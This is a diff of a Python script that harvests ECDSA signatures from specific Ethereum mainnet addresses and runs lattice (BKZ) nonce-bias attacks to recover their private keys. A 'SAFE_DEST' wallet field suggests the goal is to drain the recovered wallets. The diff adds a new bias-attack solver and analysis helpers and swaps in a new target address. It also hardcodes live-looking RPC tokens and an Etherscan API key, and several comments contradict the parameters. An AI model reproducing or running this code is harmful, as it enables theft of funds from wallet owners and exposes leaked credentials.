@@ -10,14 +10,15 @@ from eth_keys import keys
 from Crypto.Hash import keccak as ckeccak
 from sage.all import Matrix, ZZ, vector, QQ, RealField, RR, log, EllipticCurve, GF, inverse_mod, Integer, power_mod
 from fpylll import IntegerMatrix, GSO, BKZ, LLL, FPLLL, Enumeration
+# from fplll import LLL, BKZ, GSO, IntegerMatrix
 import cryptocheck
 
 # 1. Connect to an Ethereum Node (use your own RPC URL)
 # RPC_URL = "https://small-ancient-replica.quiknode.pro/2aa3c69e6d3ac4f1ab4221ee8c9793e9f6e95532"
 CONFIG = {
     # "RPC_URL": "https://Mainnet.infura.io/v3/70eacff3195c4af6af76fe8171529091",
-    # "RPC_URL": "https://small-ancient-replica.ethereum-mainnet.quiknode.pro/2aa3c69e6d3ac4f1ab4221ee8c9793e9f6e95532",
-    "RPC_URL": "https://attentive-wispy-owl.quiknode.pro/1bd932de9bb976cfe86a9ecd58675fd575d6d9f1",
+    "RPC_URL": "https://indulgent-fluent-fog.ethereum-mainnet.quiknode.pro/57aa2423c013b6d13f1dc4d41d4f959e95962cf2",
+    # "RPC_URL": "https://attentive-wispy-owl.quiknode.pro/1bd932de9bb976cfe86a9ecd58675fd575d6d9f1",
     "ETHERSCAN_KEY": "CI3EABWI86DGFJ8PICBKRD6XSFQPPNMG3Z",
     "My_Addr": "0xf8AFf1b46E30ecBB6BFAD49513f18c4f31E3661e",
     "SAFE_DEST": "0xYourSafeWalletAddress",
@@ -196,6 +197,92 @@ def is_pure_tx(tx_receipt):
             is_not_contract = False
     return not is_failed_tx and is_simpled_tx and is_not_contract and (int(tx_receipt['blockNumber']) < limitBlockNumber)
 
+def detect_RFC6979(sigs):
+    from collections import defaultdict
+    z_map = defaultdict(list)
+    for z, r, s, v in sigs:
+        z_map[z].append((r, s))
+
+    # Check for duplicates
+    for z, sig_list in z_map.items():
+        print(sig_list)
+        if len(sig_list) > 1:
+            # Check if the signatures are the same
+            if len(set(sig_list)) == 1:
+                print(f"[!] RFC 6979 DETECTED for z: {z}")
+            else:
+                print(f"[+] Random ECDSA Detected for z: {z} (Signatures vary)")
+
+def compare_s_values(sigs): #To detect HIGH-S
+    s_prefixes = [hex(int(s))[:4] for z, r, s, v in sigs]
+    from collections import Counter
+    print(f"S-Value Prefix Distribution at 08:12 AM:\n{Counter(s_prefixes)}")
+
+def signature_from_components(r, s, v):
+    """
+    Packs r, s, and v into a 65-byte recoverable signature.
+    Time: 08:53 AM | Friday, June 5, 2026
+    """
+    r_bytes = int(r).to_bytes(32, 'big')
+    s_bytes = int(s).to_bytes(32, 'big')
+    
+    # Normalize v: 27/28 -> 0/1 (standard for coincurve/eth_keys)
+    v_int = int(v)
+    rec_id = v_int - 27 if v_int >= 27 else v_int
+    v_byte = rec_id.to_bytes(1, 'big')
+    
+    return r_bytes + s_bytes + v_byte
+
+def derive_address_from_pk(pk):
+    """Derives an Ethereum address from a Coincurve PublicKey object."""
+    # 1. Get the uncompressed public key (65 bytes)
+    # 2. Remove the first byte (0x04 prefix) to get 64 bytes
+    public_key_bytes = pk.format(compressed=False)[1:]
+    
+    # 3. Apply Keccak-256
+    keccak_hash = keccak.new(digest_bits=256)
+    keccak_hash.update(public_key_bytes)
+    hash_result = keccak_hash.hexdigest()
+    
+    # 4. Take the last 20 bytes (40 characters)
+    return "0x" + hash_result[-40:]
+
+def verify_data_integrity(sigs, target_address):
+    print(f"[*] Integrity Check at 08:44 AM (June 5, 2026)")
+    print(f"[*] Testing first 5 signatures for address: {target_address}")
+    
+    success_count = 0
+    for i, (z, r, s, v) in enumerate(sigs[:5]):
+        try:
+            # v is usually 27/28 or 0/1. Coincurve expects 0-3 for recovery ID.
+            rec_id = int(v) - 27 if int(v) >= 27 else int(v)
+            
+            # Reconstruct the signature
+            sig_65_bytes = signature_from_components(r, s, v)
+            
+            # Recover Public Key
+            # Note: z must be the 32-byte message hash (bytes)
+            z_bytes = int(z).to_bytes(32, 'big')
+            
+            pk = PublicKey.from_signature_and_message(sig_65_bytes, z_bytes, hasher=None)
+            
+            # Convert PK to Address (Simplified Example)
+            # Replace this with your specific address derivation logic
+            # (e.g., Keccak256 for Ethereum or Hash160 for Bitcoin)
+            recovered_addr = derive_address_from_pk(pk) 
+            
+            if recovered_addr.lower() == target_address.lower():
+                print(f" [OK] Signature {i} matches!")
+                success_count += 1
+            else:
+                print(f" [FAIL] Signature {i} recovered wrong address: {recovered_addr}")
+                
+        except Exception as e:
+            print(f" [ERROR] Signature {i}: {str(e)}")
+            
+    return success_count
+
+
 def get_live_signatures(address):
     """Phase 1: Real-time Signature Harvesting"""
     print(f"[{time.strftime('%H:%M:%S')}] Scanning history for {address}...")
@@ -239,14 +326,16 @@ def get_live_signatures(address):
             # print(nonce)
             z_int, r_int, s_int, v_int = get_legacy_tx_values(tx_data['hash'])
             if s_int > N // 2:
+                print(s_int)
                 print("Big-found")
                 sBigCnt += 1
-            # if minRLength > len(hex(r_int)) - 2:
-            #     minRLength = len(hex(r_int)) - 2
-            #     minRNonce = int(tx_data['nonce'])
+                # return
+            if minRLength > len(hex(r_int)) - 2:
+                minRLength = len(hex(r_int)) - 2
+                minRNonce = int(tx_data['nonce'])
             print(len(hex(r_int)) - 2)
-            # if len(hex(r_int)) - 2 > 63:
-            #     continue
+            if len(hex(r_int)) - 2 > 63:
+                continue
             if cryptocheck.verify_z(z_int, r_int, s_int, v_int, address):
                 vCnt += 1
             sigs.append((z_int, r_int, s_int, v_int))
@@ -267,11 +356,17 @@ def get_live_signatures(address):
     print(f"vCnt->{vCnt} sBigCnt->{sBigCnt}")
     print(f"minRLength-{minRLength}, minRNonce-{minRNonce}")
     sigs = sorted(sigs, key=lambda x: int(x[1]))
+    # analyze_lsb_bias(sigs)
+    # analyze_msb_bias(sigs)
+    # detect_RFC6979(sigs)
+    # compare_s_values(sigs)
+    # verify_data_integrity(sigs, address)
 
     # is_uniqu_sigs(sigs)
     # solve_foundation_lattice(sigs, address)
     # solve_foundation_lattice_ZZ(sigs, address)
-    solve_lsb_foundation_perfect(sigs, address)
+    solve_subtle_bias_2015(sigs, address)
+    # solve_lsb_foundation_perfect(sigs, address)
     # solve_universal_msb(sigs, address)
     # solve_foundation_lattice_advance_fyplll(sigs, address)
     # solve_foundation_lattice_ftplll(sigs, address)
@@ -418,6 +513,41 @@ def check_z_final(l_matrix, normalized_sigs):
                 print("Good")
     print("Bad")
 
+def analyze_msb_bias(sigs):
+    r_prefixes = [hex(int(r))[:4] for z, r, s, v in sigs]
+    from collections import Counter
+    print(Counter(r_prefixes))
+
+
+def analyze_lsb_bias(sigs):
+    print(f"[*] Analyzing 90 signatures for LSB bias at 10:02 PM...")
+    
+    # We will track the last hex digit (4 bits) of (z * s^-1 mod N)
+    last_hex_digits = []
+    
+    for z, r, s, v in sigs:
+        s_inv = pow(int(s), -1, N)
+        u_i = (int(z) * s_inv) % N
+        
+        # Get the last hex digit
+        last_hex = hex(u_i % 16) 
+        last_hex_digits.append(last_hex)
+    
+    # Count occurrences
+    from collections import Counter
+    counts = Counter(last_hex_digits)
+    
+    print("\n[!] LSB Hex Digit Distribution:")
+    for digit, count in counts.most_common():
+        percentage = (count / len(sigs)) * 100
+        print(f" Digit {digit}: {count} occurrences ({percentage:.2f}%)")
+
+    # Conclusion
+    if counts.most_common(1)[0][1] > (len(sigs) * 0.7):
+        print(f"\n[+] BIAS DETECTED! Use lsb_bits = 4 and focus on digit {counts.most_common(1)[0][0]}")
+    else:
+        print("\n[-] No obvious 4-bit constant bias found. Try lsb_bits = 1 or 2.")
+
     
 # def solve_foundation_lattice(signatures, bias_bits, target_address):
 def solve_foundation_lattice(signatures, target_address):
@@ -498,6 +628,135 @@ def solve_foundation_lattice(signatures, target_address):
     # print("[x] No key found. Check Z-hashes or increase Bias Bits.")
     return None
 
+def solve_subtle_bias_2015(sigs, target_address):
+    """
+    Subtle Bias (0.5-bit) Lattice Attack for 2015 Nanopool-Era Signatures.
+    Execution Time: 11:59 PM | Matrix: 92x92 | Block Size: 45
+    """
+    # N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
+    m = len(sigs)
+    
+    normalized_sigs = []
+    for z, r, s, v in sigs:
+        # ONLY flip s if it is physically in the high range. 
+        # Do NOT flip z. The relationship s = k^-1(z + rd) handles the sign of k.
+        # if s >= HALF_N or v == 28:
+        if s >= HALF_N:
+        # if v == 27:
+            s_fixed = N - s
+        else:
+            s_fixed = s
+        normalized_sigs.append((z, r, s_fixed))
+
+    # We assume a 1-bit bias (the weakest possible) but use a relaxed bound
+    # to account for the 0.5-bit statistical drift.
+    lsb_bits = 2
+    B = 2**(256 - lsb_bits)
+    A_lsb = pow(2, lsb_bits, N)
+    A_inv = pow(A_lsb, -1, N)
+
+    # Constructing a weighted centered lattice
+    # The weight factor helps the lattice prioritize the 'shortness' of the nonces
+    L = Matrix(ZZ, m + 2, m + 2)
+    
+    print(f"[*] [{time.strftime('%I:%M %p')}] Constructing Heavy Centered Lattice (92x92)...")
+    
+    # for i, (z, r, s) in enumerate(normalized_sigs):
+    #     s_inv = pow(int(s), -1, N)
+    #     t_i = (int(r) * s_inv * A_inv) % N
+    #     u_i = (int(z) * s_inv * A_inv) % N
+        
+    #     L[i, i] = N
+    #     L[m, i] = t_i
+    #     # Centering u_i helps capture nonces regardless of sign (k or -k)
+    #     L[m + 1, i] = (u_i - (B // 2))
+
+    # L[m, m] = 1
+    # L[m + 1, m + 1] = B // 2 
+    for i, (z, r, s) in enumerate(normalized_sigs):
+        # Ensure signatures are valid via your working _recover_hash logic
+        s_inv = pow(int(s), -1, N)
+        t_i = (int(r) * s_inv) % N
+        u_i = (int(z) * s_inv) % N
+        
+        L[i, i] = N
+        L[m, i] = t_i
+        L[m+1, i] = u_i
+        
+    L[m, m] = 1
+    L[m+1, m+1] = B 
+
+    # High-Precision Reduction
+    A = IntegerMatrix.from_matrix(L)
+    FPLLL.set_precision(256) 
+    
+    print(f"[*] [{time.strftime('%I:%M %p')}] Starting GSO (MPFR 256-bit)...")
+    gso = GSO.Mat(A, float_type="mpfr")
+    gso.update_gso()
+    
+    # BKZ-45 is significantly more powerful than BKZ-24. 
+    # It is required to 'pull' the key from a subtle 0.5-bit bias.
+    print(f"[*] Starting HEAVY BKZ-45 reduction. This may take 20-30 minutes...")
+    lll_obj = LLL.Reduction(gso)
+    lll_obj() 
+    
+    # Using an aggressive block size for subtle leaks
+    bkz = BKZ.Reduction(gso, lll_obj, BKZ.Param(block_size=60, flags=BKZ.VERBOSE))
+    bkz()
+
+
+    for row_idx, row in enumerate(A):
+        # Monitoring length
+        row_bits = int(abs(row[m])).bit_length()
+        if row_bits < 200:
+            print(f"[*] Row {row_idx} looks promising ({row_bits} bits). Scanning columns...")
+
+        # Strategy A: Direct Private Key Recovery across multiple columns
+        for target_col in [m, m + 1, m - 1]:
+            d_base = abs(int(row[target_col])) % N
+            if d_base <= 1: continue 
+
+            # Wide drift search for rounding errors
+            for drift in range(-500, 501):
+                d_cand = (d_base + drift) % N
+                # Testing d and -d variants
+                if multi_verify_address([d_cand, (N - d_cand) % N], target_address):
+                    print(f"\n[!!!] SUCCESS: Found via Column {target_col} in row {row_idx} at {time.strftime('%I:%M %p')}")
+                    # print(f"[!] Private Key: {hex(d_cand)}")
+                    print("found")
+                    return d_cand
+
+        # Strategy B: Nonce-Based Recovery (Four-Way Test)
+        for i in range(m):
+            k_base = abs(int(row[i])) % N
+            if k_base <= 1: continue
+            
+            z, r, s = normalized_sigs[i]
+            r_inv = pow(r, -1, N)
+
+            for drift in range(-500, 501):
+                k_cand = (k_base + drift) % N
+                # The 'Four-Way' candidate check handles s-low and message flips
+                d_candidates = [
+                    (s * k_cand - z) * r_inv % N,
+                    (s * k_cand + z) * r_inv % N,
+                    (s * (N - k_cand) - z) * r_inv % N,
+                    (s * (N - k_cand) + z) * r_inv % N
+                ]
+                # Check both d and -d for each candidate
+                full_test_list = []
+                for cand in d_candidates:
+                    full_test_list.extend([cand, (N - cand) % N])
+                
+                if multi_verify_address(full_test_list, target_address):
+                    print(f"\n[!!!] SUCCESS: Found via Nonce {i} in row {row_idx} at {time.strftime('%I:%M %p')}")
+                    # We have to re-verify which specific candidate hit
+                    for final_d in full_test_list:
+                        if multi_verify_address([final_d], target_address):
+                            # print(f"[!] Private Key: {hex(final_d)}")
+                            print("found")
+                            return final_d
+
 def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=1):
     """
     Solves HNP for LSB leakage (k = 2^B * k' + 0).
@@ -509,8 +768,8 @@ def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=1):
         # ONLY flip s if it is physically in the high range. 
         # Do NOT flip z. The relationship s = k^-1(z + rd) handles the sign of k.
         # if s >= HALF_N or v == 28:
-        # if s >= HALF_N:
-        if v == 27:
+        if s >= HALF_N:
+        # if v == 27:
             s_fixed = N - s
         else:
             s_fixed = s
@@ -525,7 +784,7 @@ def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=1):
     B = 2**(256 - lsb_bits)
     scale = N // B
     
-    L = Matrix(QQ, m + 2, m + 2)
+    L = Matrix(ZZ, m + 2, m + 2)
     print(f"[*] [06:23 PM] Constructing LSB Lattice for {m} signatures...")
 
     for i, (z, r, s) in enumerate(normalized_sigs):
@@ -544,7 +803,8 @@ def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=1):
     L[m + 1, m + 1] = B // 2
 
     # 1. Cast and High Precision
-    A = IntegerMatrix.from_matrix(L.change_ring(ZZ))
+    # A = IntegerMatrix.from_matrix(L.change_ring(ZZ))
+    A = IntegerMatrix.from_matrix(L)
     FPLLL.set_precision(256)
     
     # 2. GSO & LLL Pre-reduction
@@ -556,7 +816,7 @@ def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=1):
     # 3. BKZ Reduction
     print("[*] Starting LSB BKZ Reduction...")
     # Initialize with 3 arguments: GSO, LLL, and initial Params
-    init_params = BKZ.Param(block_size=32, strategies=BKZ.DEFAULT_STRATEGY, flags=BKZ.VERBOSE)
+    init_params = BKZ.Param(block_size=45, strategies=BKZ.DEFAULT_STRATEGY, flags=BKZ.VERBOSE)
     bkz = BKZ.Reduction(gso, lll_obj, init_params)
     bkz()
 
@@ -1420,7 +1680,7 @@ if __name__ == "__main__":
     #address = "0x120A270bbC009644e35F0bB6ab13f95b8199c4ad"
     #0x560bd2ACBba08ef2b330BF691aB10D4935002038
     #0xC839EE5542b4E8413246b3634C5c739fEA949562
-    address = "0x560bd2ACBba08ef2b330BF691aB10D4935002038"
+    address = "0x4Bb96091Ee9D802ED039C4D1a5f6216F90f81B01"
     # Example: A random early 2015 transaction hash
     hash1 = "0x6b4ffaf6c3bef140d4d081b5bd8146c91149418c0edbc11b5632a7d74c459f80" 
     # hash2 = "0x373b8f71941cb7c70e5bbcd7341acf7106e31f95254527c7d33c0ce98d320af5"
